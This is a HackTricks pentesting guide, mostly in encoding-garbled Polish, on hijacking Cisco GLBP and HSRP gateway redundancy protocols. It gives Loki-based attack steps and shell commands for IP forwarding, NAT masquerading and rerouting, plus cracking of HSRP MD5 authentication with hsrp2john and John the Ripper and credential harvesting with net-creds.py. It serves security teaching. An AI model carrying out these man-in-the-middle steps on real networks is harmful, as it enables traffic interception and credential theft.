# GLBP & HSRP Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## FHRP Hijacking Overview

### Insights into FHRP
FHRP zosta zaprojektowany w celu zapewnienia odpornoci sieciowej poprzez poczenie wielu router贸w w jedn wirtualn jednostk, co zwiksza rozkad obci偶enia i tolerancj na awarie. Cisco Systems wprowadzio w tej grupie znane protokoy, takie jak GLBP i HSRP.

### GLBP Protocol Insights
Stworzony przez Cisco GLBP dziaa na stosie TCP/IP, wykorzystujc UDP na porcie 3222 do komunikacji. Routery w grupie GLBP wymieniaj pakiety "hello" co 3 sekundy. Jeli router nie wyle tych pakiet贸w przez 10 sekund, uznaje si go za offline. Jednak te timery nie s stae i mog by modyfikowane.

### GLBP Operations and Load Distribution
GLBP wyr贸偶nia si umo偶liwieniem rozkadu obci偶enia midzy routerami przy u偶yciu jednego wirtualnego adresu IP poczonego z wieloma wirtualnymi adresami MAC. W grupie GLBP ka偶dy router bierze udzia w przesyaniu pakiet贸w. W przeciwiestwie do HSRP/VRRP, GLBP oferuje prawdziwe r贸wnowa偶enie obci偶enia poprzez kilka mechanizm贸w:

- **Host-Dependent Load Balancing:** Utrzymuje stae przypisanie adresu MAC AVF do hosta, co jest niezbdne dla stabilnych konfiguracji NAT.
- **Round-Robin Load Balancing:** Domylne podejcie, naprzemienne przypisanie adresu MAC AVF midzy 偶dajcymi hostami.
- **Weighted Round-Robin Load Balancing:** Rozkada obci偶enie na podstawie zdefiniowanych metryk "Wagi".

### Key Components and Terminologies in GLBP
- **AVG (Active Virtual Gateway):** G贸wny router, odpowiedzialny za przydzielanie adres贸w MAC do router贸w partnerskich.
- **AVF (Active Virtual Forwarder):** Router wyznaczony do zarzdzania ruchem sieciowym.
- **GLBP Priority:** Metryka, kt贸ra okrela AVG, zaczynajca si od domylnej wartoci 100 i mieszczca si w zakresie od 1 do 255.
- **GLBP Weight:** Odzwierciedla aktualne obci偶enie routera, regulowane rcznie lub poprzez Object Tracking.
- **GLBP Virtual IP Address:** Su偶y jako domylny brama sieciowa dla wszystkich podczonych urzdze.

Do interakcji GLBP wykorzystuje zarezerwowany adres multicast 224.0.0.102 oraz port UDP 3222. Routery przesyaj pakiety "hello" co 3 sekundy i s uznawane za nieoperacyjne, jeli pakiet zostanie pominity przez 10 sekund.

### GLBP Attack Mechanism
Atakujcy mo偶e sta si g贸wnym routerem, wysyajc pakiet GLBP z najwy偶sz wartoci priorytetu (255). Mo偶e to prowadzi do atak贸w DoS lub MITM, umo偶liwiajc przechwytywanie lub przekierowywanie ruchu.

### Executing a GLBP Attack with Loki
[Loki](https://github.com/raizo62/loki_on_kali) mo偶e przeprowadzi atak GLBP, wstrzykujc pakiet z priorytetem i wag ustawionymi na 255. Kroki przed atakiem obejmuj zbieranie informacji, takich jak wirtualny adres IP, obecno uwierzytelnienia i wartoci priorytetu routera za pomoc narzdzi takich jak Wireshark.

Kroki ataku:
1. Przecz si w tryb promiskuitywny i wcz przekazywanie IP.
2. Zidentyfikuj docelowy router i pobierz jego adres IP.
3. Wygeneruj Gratuitous ARP.
4. Wstrzyknij zoliwy pakiet GLBP, podszywajc si pod AVG.
5. Przypisz dodatkowy adres IP do interfejsu sieciowego atakujcego, odzwierciedlajc wirtualny adres IP GLBP.
6. Wdro偶 SNAT dla penej widocznoci ruchu.
7. Dostosuj routing, aby zapewni cigy dostp do internetu przez oryginalny router AVG.

Postpujc zgodnie z tymi krokami, atakujcy staje si "czowiekiem w rodku", zdolnym do przechwytywania i analizowania ruchu sieciowego, w tym niezaszyfrowanych lub wra偶liwych danych.

Dla demonstracji oto wymagane fragmenty polece:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### Passive Explanation of HSRP Hijacking with Command Details

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)
HSRP to protok贸 wasnociowy Cisco zaprojektowany do redundancji bram sieciowych. Umo偶liwia konfiguracj wielu fizycznych router贸w w jedn logiczn jednostk z wsp贸lnym adresem IP. Ta logiczna jednostka jest zarzdzana przez g贸wny router odpowiedzialny za kierowanie ruchem. W przeciwiestwie do GLBP, kt贸ry wykorzystuje metryki takie jak priorytet i waga do r贸wnowa偶enia obci偶enia, HSRP polega na jednym aktywnym routerze do zarzdzania ruchem.

#### Roles and Terminology in HSRP
- **HSRP Active Router**: Urzdzenie dziaajce jako brama, zarzdzajce przepywem ruchu.
- **HSRP Standby Router**: Router zapasowy, gotowy do przejcia, jeli router aktywny zawiedzie.
- **HSRP Group**: Zestaw router贸w wsp贸pracujcych w celu utworzenia jednego odpornego wirtualnego routera.
- **HSRP MAC Address**: Wirtualny adres MAC przypisany do logicznego routera w konfiguracji HSRP.
- **HSRP Virtual IP Address**: Wirtualny adres IP grupy HSRP, dziaajcy jako domylna brama dla podczonych urzdze.

#### HSRP Versions
HSRP wystpuje w dw贸ch wersjach, HSRPv1 i HSRPv2, r贸偶nicych si g贸wnie pojemnoci grupy, u偶yciem adres贸w IP multicast oraz struktur wirtualnego adresu MAC. Protok贸 wykorzystuje okrelone adresy IP multicast do wymiany informacji o usugach, z pakietami Hello wysyanymi co 3 sekundy. Router uznawany jest za nieaktywny, jeli w cigu 10 sekund nie otrzyma 偶adnego pakietu.

#### HSRP Attack Mechanism
Ataki HSRP polegaj na przymusowym przejciu roli Aktywnego Routera poprzez wstrzyknicie maksymalnej wartoci priorytetu. Mo偶e to prowadzi do ataku Man-In-The-Middle (MITM). Kluczowe kroki przed atakiem obejmuj zbieranie danych o konfiguracji HSRP, co mo偶na zrobi za pomoc Wireshark do analizy ruchu.

#### Steps for Bypassing HSRP Authentication
1. Zapisz ruch sieciowy zawierajcy dane HSRP jako plik .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Wyodrbnij hashe MD5 z pliku .pcap za pomoc hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Zam hashe MD5 za pomoc John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Executing HSRP Injection with Loki**

1. Uruchom Loki, aby zidentyfikowa ogoszenia HSRP.
2. Ustaw interfejs sieciowy w trybie promiskuitywnym i wcz przekazywanie IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. U偶yj Loki, aby celowa w konkretny router, wprowad藕 zamane haso HSRP i wykonaj niezbdne konfiguracje, aby udawa Aktywny Router.
4. Po przejciu roli Aktywnego Routera skonfiguruj sw贸j interfejs sieciowy i tabele IP, aby przechwytywa prawidowy ruch.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Zmodyfikuj tabel routingu, aby kierowa ruch przez byego Aktywnego Routera.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. U偶yj net-creds.py lub podobnego narzdzia, aby przechwyci dane uwierzytelniajce z przechwyconego ruchu.
```shell
sudo python2 net-creds.py -i eth0
```

Wykonanie tych krok贸w stawia atakujcego w pozycji do przechwytywania i manipulowania ruchem, podobnie jak w przypadku przejcia GLBP. Podkrela to podatno w protokoach redundancji, takich jak HSRP, oraz potrzeb solidnych rodk贸w bezpieczestwa.


## References
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
